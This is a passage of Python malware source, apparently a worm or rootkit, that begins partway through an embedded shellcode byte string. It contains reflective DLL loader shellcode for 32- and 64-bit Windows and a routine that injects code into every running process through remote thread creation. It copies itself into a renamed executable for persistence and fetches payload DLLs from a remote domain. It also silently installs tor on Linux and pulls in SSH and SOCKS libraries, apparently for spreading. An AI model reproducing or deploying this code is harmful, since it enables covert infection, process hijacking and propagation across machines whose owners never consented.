F\xFF\x6A\x00\x6A\x00\x6A\xFF\xFF\x94\x24\xC4\x00\x00\x00\x83\xBD\xC4\x00\x00\x00\x00\x74\x26\x8B\x85\xC0\x00\x00\x00\x8B\x74\x18\x0C\x8B\x06\x85\xC0\x74\x16\x33\xED\x45\x6A\x00\x55\x53\xFF\xD0\x8D\x76\x04\x8B\x06\x85\xC0\x75\xF1\x8B\x6C\x24\x28\x33\xC0\x40\x50\x50\x8B\x45\x28\x53\x03\xC3\xFF\xD0\x83\xBC\x24\x2C\x01\x00\x00\x00\x0F\x84\xAB\x00\x00\x00\x83\x7D\x7C\x00\x0F\x84\xA1\x00\x00\x00\x8B\x55\x78\x03\xD3\x8B\x6A\x18\x85\xED\x0F\x84\x91\x00\x00\x00\x83\x7A\x14\x00\x0F\x84\x87\x00\x00\x00\x8B\x7A\x20\x8B\x4A\x24\x03\xFB\x83\x64\x24\x30\x00\x03\xCB\x85\xED\x74\x74\x8B\x37\xC7\x44\x24\x10\x00\x00\x00\x00\x03\xF3\x74\x66\x8A\x06\x84\xC0\x74\x1A\x8B\x6C\x24\x10\x0F\xBE\xC0\x03\xE8\xC1\xCD\x0D\x46\x8A\x06\x84\xC0\x75\xF1\x89\x6C\x24\x10\x8B\x6A\x18\x8B\x84\x24\x2C\x01\x00\x00\x3B\x44\x24\x10\x75\x04\x85\xC9\x75\x15\x8B\x44\x24\x30\x83\xC7\x04\x40\x83\xC1\x02\x89\x44\x24\x30\x3B\xC5\x72\xAE\xEB\x20\x0F\xB7\x09\x8B\x42\x1C\xFF\xB4\x24\x34\x01\x00\x00\xFF\xB4\x24\x34\x01\x00\x00\x8D\x04\x88\x8B\x04\x18\x03\xC3\xFF\xD0\x59\x59\x8B\xC3\xEB\x02\x33\xC0\x5F\x5E\x5D\x5B\x81\xC4\x14\x01\x00\x00\xC3\x83\xEC\x14\x64\xA1\x30\x00\x00\x00\x53\x55\x56\x8B\x40\x0C\x57\x89\x4C\x24\x1C\x8B\x78\x0C\xE9\xA5\x00\x00\x00\x8B\x47\x30\x33\xF6\x8B\x5F\x2C\x8B\x3F\x89\x44\x24\x10\x8B\x42\x3C\x89\x7C\x24\x14\x8B\x6C\x10\x78\x89\x6C\x24\x18\x85\xED\x0F\x84\x80\x00\x00\x00\xC1\xEB\x10\x33\xC9\x85\xDB\x74\x2F\x8B\x7C\x24\x10\x0F\xBE\x2C\x0F\xC1\xCE\x0D\x80\x3C\x0F\x61\x89\x6C\x24\x10\x7C\x09\x8B\xC5\x83\xC0\xE0\x03\xF0\xEB\x04\x03\x74\x24\x10\x41\x3B\xCB\x72\xDD\x8B\x7C\x24\x14\x8B\x6C\x24\x18\x8B\x44\x2A\x20\x33\xDB\x8B\x4C\x2A\x18\x03\xC2\x89\x4C\x24\x10\x85\xC9\x74\x34\x8B\x38\x33\xED\x03\xFA\x83\xC0\x04\x89\x44\x24\x20\x8A\x0F\xC1\xCD\x0D\x0F\xBE\xC1\x03\xE8\x47\x84\xC9\x75\xF1\x8B\x7C\x24\x14\x8D\x04\x2E\x3B\x44\x24\x1C\x74\x20\x8B\x44\x24\x20\x43\x3B\x5C\x24\x10\x72\xCC\x8B\x57\x18\x85\xD2\x0F\x85\x50\xFF\xFF\xFF\x33\xC0\x5F\x5E\x5D\x5B\x83\xC4\x14\xC3\x8B\x74\x24\x18\x8B\x44\x16\x24\x8D\x04\x58\x0F\xB7\x0C\x10\x8B\x44\x16\x1C\x8D\x04\x88\x8B\x04\x10\x03\xC2\xEB\xDB'
    rdiShellcode64 = b'\x48\x8B\xC4\x48\x89\x58\x08\x44\x89\x48\x20\x4C\x89\x40\x18\x89\x50\x10\x55\x56\x57\x41\x54\x41\x55\x41\x56\x41\x57\x48\x8D\x6C\x24\x90\x48\x81\xEC\x70\x01\x00\x00\x45\x33\xFF\xC7\x45\xD8\x6B\x00\x65\x00\x48\x8B\xF1\x4C\x89\x7D\xF8\xB9\x13\x9C\xBF\xBD\x4C\x89\x7D\xC8\x4C\x89\x7D\x08\x45\x8D\x4F\x65\x4C\x89\x7D\x10\x44\x88\x4D\xBC\x44\x88\x4D\xA2\x4C\x89\x7D\x00\x4C\x89\x7D\xF0\x4C\x89\x7D\x18\x44\x89\x7D\x24\x44\x89\x7C\x24\x2C\xC7\x45\xDC\x72\x00\x6E\x00\xC7\x45\xE0\x65\x00\x6C\x00\xC7\x45\xE4\x33\x00\x32\x00\xC7\x45\xE8\x2E\x00\x64\x00\xC7\x45\xEC\x6C\x00\x6C\x00\xC7\x44\x24\x40\x53\x6C\x65\x65\xC6\x44\x24\x44\x70\xC7\x44\x24\x58\x4C\x6F\x61\x64\xC7\x44\x24\x5C\x4C\x69\x62\x72\xC7\x44\x24\x60\x61\x72\x79\x41\xC7\x44\x24\x48\x56\x69\x72\x74\xC7\x44\x24\x4C\x75\x61\x6C\x41\xC7\x44\x24\x50\x6C\x6C\x6F\x63\xC7\x44\x24\x68\x56\x69\x72\x74\xC7\x44\x24\x6C\x75\x61\x6C\x50\xC7\x44\x24\x70\x72\x6F\x74\x65\x66\xC7\x44\x24\x74\x63\x74\xC7\x45\xA8\x46\x6C\x75\x73\xC7\x45\xAC\x68\x49\x6E\x73\xC7\x45\xB0\x74\x72\x75\x63\xC7\x45\xB4\x74\x69\x6F\x6E\xC7\x45\xB8\x43\x61\x63\x68\xC7\x44\x24\x78\x47\x65\x74\x4E\xC7\x44\x24\x7C\x61\x74\x69\x76\xC7\x45\x80\x65\x53\x79\x73\xC7\x45\x84\x74\x65\x6D\x49\x66\xC7\x45\x88\x6E\x66\xC6\x45\x8A\x6F\xC7\x45\x90\x52\x74\x6C\x41\xC7\x45\x94\x64\x64\x46\x75\xC7\x45\x98\x6E\x63\x74\x69\xC7\x45\x9C\x6F\x6E\x54\x61\x66\xC7\x45\xA0\x62\x6C\xE8\x7F\x08\x00\x00\xB9\xB5\x41\xD9\x5E\x48\x8B\xD8\xE8\x72\x08\x00\x00\x4C\x8B\xE8\x48\x89\x45\xD0\x48\x8D\x45\xD8\xC7\x45\x20\x18\x00\x18\x00\x4C\x8D\x4C\x24\x38\x48\x89\x45\x28\x4C\x8D\x45\x20\x33\xD2\x33\xC9\xFF\xD3\x48\x8B\x4C\x24\x38\x48\x8D\x44\x24\x48\x45\x33\xC0\x48\x89\x44\x24\x30\x4C\x8D\x4D\xC8\xC7\x44\x24\x28\x0C\x00\x0C\x00\x48\x8D\x54\x24\x28\x41\xFF\xD5\x48\x8B\x4C\x24\x38\x48\x8D\x44\x24\x68\x45\x33\xC0\x48\x89\x44\x24\x30\x4C\x8D\x4D\x00\xC7\x44\x24\x28\x0E\x00\x0E\x00\x48\x8D\x54\x24\x28\x41\xFF\xD5\x48\x8D\x45\xA8\xC7\x44\x24\x28\x15\x00\x15\x00\x48\x8B\x4C\x24\x38\x4C\x8D\x4D\x08\x45\x33\xC0\x48\x89\x44\x24\x30\x48\x8D\x54\x24\x28\x41\xFF\xD5\x48\x8B\x4C\x24\x38\x48\x8D\x44\x24\x78\x45\x33\xC0\x48\x89\x44\x24\x30\x4C\x8D\x4D\x10\xC7\x44\x24\x28\x13\x00\x13\x00\x48\x8D\x54\x24\x28\x41\xFF\xD5\x48\x8B\x4C\x24\x38\x48\x8D\x44\x24\x40\x45\x33\xC0\x48\x89\x44\x24\x30\x4C\x8D\x4D\xF0\xC7\x44\x24\x28\x05\x00\x05\x00\x48\x8D\x54\x24\x28\x41\xFF\xD5\x48\x8B\x4C\x24\x38\x48\x8D\x45\x90\x45\x33\xC0\x48\x89\x44\x24\x30\x4C\x8D\x4D\x18\xC7\x44\x24\x28\x13\x00\x13\x00\x48\x8D\x54\x24\x28\x41\xFF\xD5\x48\x8B\x4C\x24\x38\x48\x8D\x44\x24\x58\x45\x33\xC0\x48\x89\x44\x24\x30\x4C\x8D\x4D\xF8\xC7\x44\x24\x28\x0C\x00\x0C\x00\x48\x8D\x54\x24\x28\x41\xFF\xD5\x4C\x39\x7D\xC8\x0F\x84\x1D\x07\x00\x00\x4C\x39\x7D\x00\x0F\x84\x13\x07\x00\x00\x4C\x39\x7D\xF0\x0F\x84\x09\x07\x00\x00\x4C\x39\x7D\x08\x0F\x84\xFF\x06\x00\x00\x48\x8B\x55\x10\x48\x85\xD2\x0F\x84\xF2\x06\x00\x00\x48\x63\x7E\x3C\x48\x03\xFE\x81\x3F\x50\x45\x00\x00\x0F\x85\xDF\x06\x00\x00\xB8\x64\x86\x00\x00\x66\x39\x47\x04\x0F\x85\xD0\x06\x00\x00\x45\x8D\x4F\x01\x44\x84\x4F\x38\x0F\x85\xC2\x06\x00\x00\x0F\xB7\x4F\x14\x41\x8B\xDF\x48\x83\xC1\x24\x66\x44\x3B\x7F\x06\x73\x25\x44\x0F\xB7\x47\x06\x48\x03\xCF\x44\x39\x79\x04\x8B\x47\x38\x0F\x45\x41\x04\x03\x01\x48\x8D\x49\x28\x3B\xC3\x0F\x46\xC3\x8B\xD8\x4D\x2B\xC1\x75\xE3\x48\x8D\x4D\x38\xFF\xD2\x8B\x55\x3C\x44\x8B\xC2\x44\x8D\x72\xFF\xF7\xDA\x44\x03\x77\x50\x49\x8D\x48\xFF\x8B\xC2\x4C\x23\xF0\x8B\xC3\x48\x03\xC8\x49\x8D\x40\xFF\x48\xF7\xD0\x48\x23\xC8\x4C\x3B\xF1\x0F\x85\x54\x06\x00\x00\x48\x8B\x4F\x30\x41\xBC\x00\x30\x00\x00\x45\x8B\xC4\x41\xB9\x04\x00\x00\x00\x49\x8B\xD6\xFF\x55\xC8\x48\x8B\xD8\x48\x85\xC0\x75\x12\x44\x8D\x48\x04\x45\x8B\xC4\x49\x8B\xD6\x33\xC9\xFF\x55\xC8\x48\x8B\xD8\x44\x8B\xA5\xD0\x00\x00\x00\x41\xBB\x01\x00\x00\x00\x45\x84\xE3\x74\x1D\x8B\x46\x3C\x89\x43\x3C\x8B\x56\x3C\xEB\x0B\x8B\xCA\x41\x03\xD3\x8A\x04\x31\x88\x04\x19\x3B\x57\x54\x72\xF0\xEB\x19\x41\x8B\xD7\x44\x39\x7F\x54\x76\x10\x8B\xCA\x41\x03\xD3\x8A\x04\x31\x88\x04\x19\x3B\x57\x54\x72\xF0\x48\x63\x7B\x3C\x45\x8B\xD7\x48\x03\xFB\x48\x89\x7D\x30\x44\x0F\xB7\x47\x14\x49\x83\xC0\x28\x66\x44\x3B\x7F\x06\x73\x3A\x4C\x03\xC7\x45\x8B\xCF\x45\x39\x38\x76\x1F\x41\x8B\x50\x04\x41\x8B\x48\xFC\x41\x8B\xC1\x45\x03\xCB\x48\x03\xC8\x48\x03\xD0\x8A\x04\x32\x88\x04\x19\x45\x3B\x08\x72\xE1\x0F\xB7\x47\x06\x45\x03\xD3\x49\x83\xC0\x28\x44\x3B\xD0\x72\xC9\x4C\x8B\xF3\x41\xB8\x02\x00\x00\x00\x4C\x2B\x77\x30\x0F\x84\xD6\x00\x00\x00\x44\x39\xBF\xB4\x00\x00\x00\x0F\x84\xC9\x00\x00\x00\x44\x8B\x8F\xB0\x00\x00\x00\x4C\x03\xCB\x45\x39\x39\x0F\x84\xB6\x00\x00\x00\x4D\x8D\x51\x08\xE9\x91\x00\x00\x00\x45\x0F\xB7\x1A\x41\x0F\xB7\xCB\x41\x0F\xB7\xC3\x66\xC1\xE9\x0C\x66\x83\xF9\x0A\x75\x29\x45\x8B\x01\x41\x81\xE3\xFF\x0F\x00\x00\x4B\x8D\x04\x18\x48\x8B\x14\x18\x4B\x8D\x04\x18\x41\xBB\x01\x00\x00\x00\x49\x03\xD6\x48\x89\x14\x18\x45\x8D\x43\x01\xEB\x4F\x41\xBB\x01\x00\x00\x00\x66\x83\xF9\x03\x75\x0E\x25\xFF\x0F\x00\x00\x48\x8D\x0C\x03\x41\x8B\xC6\xEB\x2E\x66\x41\x3B\xCB\x75\x15\x25\xFF\x0F\x00\x00\x48\x8D\x0C\x03\x49\x8B\xC6\x48\xC1\xE8\x10\x0F\xB7\xC0\xEB\x13\x66\x41\x3B\xC8\x75\x14\x25\xFF\x0F\x00\x00\x48\x8D\x0C\x03\x41\x0F\xB7\xC6\x41\x8B\x11\x48\x01\x04\x0A\x4D\x03\xD0\x41\x8B\x41\x04\x49\x03\xC1\x4C\x3B\xD0\x0F\x85\x5F\xFF\xFF\xFF\x4D\x8B\xCA\x45\x39\x3A\x0F\x85\x4A\xFF\xFF\xFF\x44\x39\xBF\x94\x00\x00\x00\x0F\x84\x82\x01\x00\x00\x8B\x8F\x90\x00\x00\x00\x45\x8B\xEF\x4C\x8D\x04\x19\x49\x8D\x40\x0C\xEB\x07\x45\x03\xEB\x48\x8D\x40\x14\x44\x39\x38\x75\xF4\x41\x8B\xC4\x83\xE0\x04\x89\x45\xC0\x8B\xC1\x0F\x84\x89\x00\x00\x00\x45\x3B\xEB\x0F\x86\x80\x00\x00\x00\x41\xC1\xEC\x10\x45\x8D\x5D\xFF\x45\x8B\xD7\x45\x85\xDB\x74\x74\x4D\x8B\xC8\x41\xBE\xFF\x7F\x00\x00\x41\x0F\x10\x01\x33\xD2\x41\x8B\xCD\x41\x2B\xCA\x69\xF6\xFD\x43\x03\x00\x41\x8B\xC6\xF7\xF1\x33\xD2\x81\xC6\xC3\x9E\x26\x00\x8D\x48\x01\x8B\xC6\xC1\xE8\x10\x41\x23\xC6\xF7\xF1\x41\x03\xC2\x41\xFF\xC2\x48\x8D\x0C\x80\x41\x8B\x54\x88\x10\x41\x0F\x10\x0C\x88\x41\x0F\x11\x04\x88\x41\x8B\x41\x10\x41\x89\x44\x88\x10\x41\x0F\x11\x09\x41\x89\x51\x10\x4D\x8D\x49\x14\x45\x3B\xD3\x72\xA1\x8B\x87\x90\x00\x00\x00\xEB\x04\x44\x8B\x65\xC0\x8B\xF0\x48\x03\xF3\x8B\x46\x0C\x85\xC0\x0F\x84\xB1\x00\x00\x00\x8B\x7D\xC0\x8B\xC8\x48\x03\xCB\xFF\x55\xF8\x48\x89\x44\x24\x38\x4C\x8B\xD0\x44\x8B\x36\x44\x8B\x7E\x10\x4C\x03\xF3\x4C\x03\xFB\x49\x8B\x0E\x48\x85\xC9\x74\x5F\x48\x85\xC9\x79\x08\x45\x0F\xB7\x06\x33\xD2\xEB\x32\x48\x8D\x53\x02\x33\xC0\x48\x03\xD1\x38\x02\x74\x0E\x48\x8B\xCA\x48\xFF\xC1\x48\xFF\xC0\x80\x39\x00\x75\xF5\x48\x89\x54\x24\x30\x45\x33\xC0\x48\x8D\x54\x24\x28\x66\x89\x44\x24\x28\x66\x89\x44\x24\x2A\x4D\x8B\xCF\x49\x8B\xCA\xFF\x55\xD0\x49\x83\xC6\x08\x49\x83\xC7\x08\x49\x8B\x0E\x48\x85\xC9\x74\x07\x4C\x8B\x54\x24\x38\xEB\xA1\x45\x33\xFF\x85\xFF\x74\x10\x41\x83\xFD\x01\x76\x0A\x41\x69\xCC\xE8\x03\x00\x00\xFF\x55\xF0\x8B\x46\x20\x48\x83\xC6\x14\x85\xC0\x0F\x85\x56\xFF\xFF\xFF\x48\x8B\x7D\x30\x4C\x8B\x6D\xD0\x44\x39\xBF\xF4\x00\x00\x00\x0F\x84\xA9\x00\x00\x00\x44\x8B\xBF\xF0\x00\x00\x00\x49\x83\xC7\x04\x4C\x03\xFB\x45\x33\xE4\x41\x8B\x07\x85\xC0\x0F\x84\x8A\x00\x00\x00\x8B\xC8\x48\x03\xCB\xFF\x55\xF8\x48\x89\x44\x24\x38\x48\x8B\xC8\x41\x8B\x77\x08\x45\x8B\x77\x0C\x48\x03\xF3\x4C\x03\xF3\x4C\x39\x26\x74\x5E\x49\x8B\x16\x48\x85\xD2\x79\x08\x44\x0F\xB7\xC2\x33\xD2\xEB\x34\x4C\x8D\x43\x02\x49\x8B\xC4\x4C\x03\xC2\x45\x38\x20\x74\x0E\x49\x8B\xD0\x48\xFF\xC2\x48\xFF\xC0\x44\x38\x22\x75\xF5\x4C\x89\x44\x24\x30\x48\x8D\x54\x24\x28\x45\x33\xC0\x66\x89\x44\x24\x28\x66\x89\x44\x24\x2A\x4C\x8B\xCE\x41\xFF\xD5\x48\x83\xC6\x08\x49\x83\xC6\x08\x4C\x39\x26\x74\x07\x48\x8B\x4C\x24\x38\xEB\xA2\x49\x83\xC7\x20\xE9\x6B\xFF\xFF\xFF\x45\x33\xFF\x0F\xB7\x77\x14\x45\x8B\xF7\x48\x83\xC6\x28\x41\xBC\x01\x00\x00\x00\x66\x44\x3B\x7F\x06\x0F\x83\x0B\x01\x00\x00\x48\x03\xF7\x44\x39\x3E\x0F\x84\xEB\x00\x00\x00\x8B\x46\x14\x8B\xC8\x81\xE1\x00\x00\x00\x20\x75\x17\x0F\xBA\xE0\x1E\x72\x11\x85\xC0\x78\x0D\x45\x8B\xC4\x44\x89\x64\x24\x20\xE9\xA4\x00\x00\x00\x85\xC9\x75\x3C\x0F\xBA\xE0\x1E\x72\x0A\x85\xC0\x79\x06\x44\x8D\x41\x08\xEB\x68\x85\xC9\x75\x28\x0F\xBA\xE0\x1E\x73\x0A\x85\xC0\x78\x06\x44\x8D\x41\x02\xEB\x54\x85\xC9\x75\x14\x0F\xBA\xE0\x1E\x73\x0A\x85\xC0\x79\x06\x44\x8D\x41\x04\xEB\x40\x85\xC9\x74\x5F\x0F\xBA\xE0\x1E\x72\x0C\x85\xC0\x78\x08\x41\xB8\x10\x00\x00\x00\xEB\x2A\x85\xC9\x74\x49\x0F\xBA\xE0\x1E\x72\x0C\x85\xC0\x79\x08\x41\xB8\x80\x00\x00\x00\xEB\x14\x85\xC9\x74\x33\x0F\xBA\xE0\x1E\x73\x11\x85\xC0\x78\x0D\x41\xB8\x20\x00\x00\x00\x44\x89\x44\x24\x20\xEB\x21\x85\xC9\x74\x18\x0F\xBA\xE0\x1E\x73\x12\x44\x8B\x44\x24\x20\x85\xC0\xB9\x40\x00\x00\x00\x44\x0F\x48\xC1\xEB\xDD\x44\x8B\x44\x24\x20\xF7\x46\x14\x00\x00\x00\x04\x74\x0A\x41\x0F\xBA\xE8\x09\x44\x89\x44\x24\x20\x8B\x4E\xFC\x4C\x8D\x4C\x24\x20\x8B\x16\x48\x03\xCB\xFF\x55\x00\x0F\xB7\x47\x06\x45\x03\xF4\x48\x83\xC6\x28\x44\x3B\xF0\x0F\x82\xF8\xFE\xFF\xFF\x45\x33\xC0\x33\xD2\x48\x83\xC9\xFF\xFF\x55\x08\x44\x39\xBF\xD4\x00\x00\x00\x74\x24\x8B\x87\xD0\x00\x00\x00\x48\x8B\x74\x18\x18\xEB\x0F\x45\x33\xC0\x41\x8B\xD4\x48\x8B\xCB\xFF\xD0\x48\x8D\x76\x08\x48\x8B\x06\x48\x85\xC0\x75\xE9\x4C\x8B\x4D\x18\x4D\x85\xC9\x74\x2F\x8B\x87\xA4\x00\x00\x00\x85\xC0\x74\x25\x8B\xC8\x4C\x8B\xC3\x48\xB8\xAB\xAA\xAA\xAA\xAA\xAA\xAA\xAA\x48\xF7\xE1\x8B\x8F\xA0\x00\x00\x00\x48\xC1\xEA\x03\x48\x03\xCB\x41\x2B\xD4\x41\xFF\xD1\x8B\x47\x28\x4D\x8B\xC4\x48\x03\xC3\x41\x8B\xD4\x48\x8B\xCB\xFF\xD0\x8B\xB5\xB8\x00\x00\x00\x85\xF6\x0F\x84\x97\x00\x00\x00\x44\x39\xBF\x8C\x00\x00\x00\x0F\x84\x8A\x00\x00\x00\x8B\x8F\x88\x00\x00\x00\x48\x03\xCB\x44\x8B\x59\x18\x45\x85\xDB\x74\x78\x44\x39\x79\x14\x74\x72\x44\x8B\x49\x20\x41\x8B\xFF\x8B\x51\x24\x4C\x03\xCB\x48\x03\xD3\x45\x85\xDB\x74\x5D\x45\x8B\x01\x45\x8B\xD7\x4C\x03\xC3\x74\x52\xEB\5x0D\x0F\xBE\xC0\x44\x03\xD0\x41\xC1\xCA\x0D\x4D\x03\xC4\x41\x8A\x00\x84\xC0\x75\xEC\x41\x3B\xF2\x75\x05\x48\x85\xD2\x75\x12\x41\x03\xFC\x49\x83\xC1\x04\x48\x83\xC2\x02\x41\x3B\xFB\x73\x22\xEB\xC3\x8B\x41\x1C\x0F\xB7\x0A\x48\x03\xC3\x8B\x95\xC8\x00\x00\x00\x44\x8B\x04\x88\x48\x8B\x8D\xC0\x00\x00\x00\x4C\x03\xC3\x41\xFF\xD0\x48\x8B\xC3\xEB\x02\x33\xC0\x48\x8B\x9C\x24\xB0\x01\x00\x00\x48\x81\xC4\x70\x01\x00\x00\x41\x5F\x41\x5E\x41\x5D\x41\x5C\x5F\x5E\x5D\xC3\xCC\x48\x8B\xC4\x48\x89\x58\x08\x48\x89\x68\x10\x48\x89\x70\x18\x48\x89\x78\x20\x41\x56\x48\x83\xEC\x10\x65\x48\x8B\x04\x25\x60\x00\x00\x00\x8B\xE9\x45\x33\xF6\x48\x8B\x50\x18\x4C\x8B\x4A\x10\x4D\x8B\x41\x30\x4D\x85\xC0\x0F\x84\xB3\x00\x00\x00\x41\x0F\x10\x41\x58\x49\x63\x40\x3C\x41\x8B\xD6\x4D\x8B\x09\xF3\x0F\x7F\x04\x24\x46\x8B\x9C\x00\x88\x00\x00\x00\x45\x85\xDB\x74\xD2\x48\x8B\x04\x24\x48\xC1\xE8\x10\x66\x44\x3B\xF0\x73\x22\x48\x8B\x4C\x24\x08\x44\x0F\xB7\xD0\x0F\xBE\x01\xC1\xCA\x0D\x80\x39\x61\x7C\x03\x83\xC2\xE0\x03\xD0\x48\xFF\xC1\x49\x83\xEA\x01\x75\xE7\x4F\x8D\x14\x18\x45\x8B\xDE\x41\x8B\x7A\x20\x49\x03\xF8\x45\x39\x72\x18\x76\x8E\x8B\x37\x41\x8B\xDE\x49\x03\xF0\x48\x8D\x7F\x04\x0F\xBE\x0E\x48\xFF\xC6\xC1\xCB\x0D\x03\xD9\x84\xC9\x75\xF1\x8D\x04\x13\x3B\xC5\x74\x0E\x41\xFF\xC3\x45\x3B\x5A\x18\x72\xD5\xE9\x5E\xFF\xFF\xFF\x41\x8B\x42\x24\x43\x8D\x0C\x1B\x49\x03\xC0\x0F\xB7\x14\x01\x41\x8B\x4A\x1C\x49\x03\xC8\x8B\x04\x91\x49\x03\xC0\xEB\x02\x33\xC0\x48\x8B\x5C\x24\x20\x48\x8B\x6C\x24\x28\x48\x8B\x74\x24\x30\x48\x8B\x7C\x24\x38\x48\x83\xC4\x10\x41\x5E\xC3'
    if is64BitDLL(dllBytes):
        rdiShellcode = rdiShellcode64
        bootstrap = b''
        bootstrapSize = 64
        bootstrap += b'\xe8\x00\x00\x00\x00'
        dllOffset = bootstrapSize - len(bootstrap) + len(rdiShellcode)
        bootstrap += b'\x59'
        bootstrap += b'\x49\x89\xc8'
        bootstrap += b'\x48\x81\xc1'
        bootstrap += struct.pack('I', dllOffset)
        bootstrap += b'\xba'
        bootstrap += struct.pack('I', functionHash)
        bootstrap += b'\x49\x81\xc0'
        userDataLocation = dllOffset + len(dllBytes)
        bootstrap += struct.pack('I', userDataLocation)
        bootstrap += b'\x41\xb9'
        bootstrap += struct.pack('I', len(userData))
        bootstrap += b'\x56'
        bootstrap += b'\x48\x89\xe6'
        bootstrap += b'\x48\x83\xe4\xf0'
        bootstrap += b'\x48\x83\xec'
        bootstrap += b'\x30'
        bootstrap += b'\xC7\x44\x24'
        bootstrap += b'\x20'
        bootstrap += struct.pack('I', asdflags)
        bootstrap += b'\xe8'
        bootstrap += struct.pack('b', bootstrapSize - len(bootstrap) - 4)
        bootstrap += b'\x00\x00\x00'
        bootstrap += b'\x48\x89\xf4'
        bootstrap += b'\x5e'
        bootstrap += b'\xc3'
        if len(bootstrap) != bootstrapSize:
            raise Exception("x64 bootstrap length: {} != bootstrapSize: {}".format(len(bootstrap), bootstrapSize))
        return bootstrap + rdiShellcode + dllBytes + userData
    else:
        rdiShellcode = rdiShellcode32
        bootstrap = b''
        bootstrapSize = 49
        bootstrap += b'\xe8\x00\x00\x00\x00'
        dllOffset = bootstrapSize - len(bootstrap) + len(rdiShellcode)
        bootstrap += b'\x58'
        bootstrap += b'\x55'
        bootstrap += b'\x89\xe5'
        bootstrap += b'\x89\xc2'
        bootstrap += b'\x05'
        bootstrap += struct.pack('I', dllOffset)
        bootstrap += b'\x81\xc2'
        userDataLocation = dllOffset + len(dllBytes)
        bootstrap += struct.pack('I', userDataLocation)
        bootstrap += b'\x68'
        bootstrap += struct.pack('I', asdflags)
        bootstrap += b'\x68'
        bootstrap += struct.pack('I', len(userData))
        bootstrap += b'\x52'
        bootstrap += b'\x68'
        bootstrap += struct.pack('I', functionHash)
        bootstrap += b'\x50'
        bootstrap += b'\xe8'
        bootstrap += struct.pack('b', bootstrapSize - len(bootstrap) - 4) # Skip over the remainder of instructions
        bootstrap += b'\x00\x00\x00'
        bootstrap += b'\x83\xc4\x14'
        bootstrap += b'\xc9'
        bootstrap += b'\xc3'
        if len(bootstrap) != bootstrapSize:
            return False
        return bootstrap + rdiShellcode + dllBytes + userData
    return False
global injecting
injecting = 0
def injectdll(process_id, shellcode):
    global injecting
    injecting += 1
    process_handle = windll.kernel32.OpenProcess(0x1F0FFF, False, process_id)
    if not process_handle:
        injecting -= 1
        return
    memory_allocation_variable = windll.kernel32.VirtualAllocEx(process_handle, 0, len(shellcode), 0x00001000, 0x40)
    windll.kernel32.WriteProcessMemory(process_handle, memory_allocation_variable, shellcode, len(shellcode), 0)
    if not windll.kernel32.CreateRemoteThread(process_handle, None, 0, memory_allocation_variable, 0, 0, 0):
        injecting -= 1
        return
    injecting -= 1
def rootkitThread(shellcode):
    while 1:
        for pid in psutil.pids():
            handle = CreateMutex(None, 0, str(pid) + ':$6829')
            if GetLastError() == 183:
                continue
            while injecting >= 4:
                time.sleep(0.1)
            threading.Thread(target=injectdll, args=(pid,shellcode,)).start()
mutex = "ukrhope"
if os.name == 'nt':
    try:
        sys.argv[1]
    except IndexError:
        subprocess.Popen(GetCommandLine() + " 1", creationflags=8, close_fds=True)
        os.kill(os.getpid(),9)
    mutex = CreateMutex(None, False, mutex)
    if GetLastError() == ERROR_ALREADY_EXISTS:
       os.kill(os.getpid(),9)
    if os.path.abspath(sys.argv[0]).lower().endswith(".exe") and not os.path.abspath(sys.argv[0]).lower().endswith("$6829.exe"):
        try:
            shutil.copyfile(os.path.abspath(sys.argv[0]), os.getenv("USERPROFILE") + "\\$6829.exe")
            os.startfile(os.getenv("USERPROFILE") + "\\$6829.exe")
            os.kill(os.getpid(),9)
        except:
            pass
    else:
        try:
            shutil.copyfile(sys.executable, os.getenv("USERPROFILE") + "\\$6829.exe")
        except:
            pass
    try:
        if platform.architecture()[0].replace("bit","") == "32":
            shellcode=ConvertToShellcode(urllib2.urlopen("http://" + mydomain + "/x86.dll").read())
        else:
            shellcode=ConvertToShellcode(urllib2.urlopen("http://" + mydomain + "/x64.dll").read())
        threading.Thread(target=rootkitThread, args=(shellcode,)).start()
    except:
        pass
else:
    daemonize()
    try:
        s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        s.bind('\0' + mutex) 
    except socket.error:
        os.kill(os.getpid(),9)
    os.popen("apt install tor -y > /dev/null 2>&1 &")
    os.popen("yum install tor -y > /dev/null 2>&1 &")
    os.popen("dnf install tor -y > /dev/null 2>&1 &")
def installsshrepz():
    global portlist,paramiko_imported
    try:
        import paramiko
        paramiko_imported=True
        if 22 not in portlist:
            portlist.insert(0, 22)    
    except ImportError:
        try:
            try:
                import pip
            except ImportError:
                urllib.urlretrieve("https://bootstrap.pypa.io/pip/2.7/get-pip.py", "get-pip.py")
                for variablex in ["", "2", "2.7"]:
                    subprocess.call(["python"+variablex, "get-pip.py"])
                os.remove("get-pip.py")
            try:
                from pip import main as pipmain
            except ImportError:
                from pip._internal import main as pipmain
            pipmain(["install", "paramiko"])
            import paramiko
            if 22 not in portlist:
                portlist.insert(0, 22)
                paramiko_imported=True
        except:
            pass
try:
    import socks
except:
    f=open("socks.py", "w")
    f.write(urllib2.urlopen("https://raw.githubusercontent.com/mikedougherty/SocksiPy/master/socks.py").read())
    f.close()
    try:
        import socks
    except:
        sys.exit(1)
threading.Thread(target=mainprocess, args=()).start()
installsshrepz()
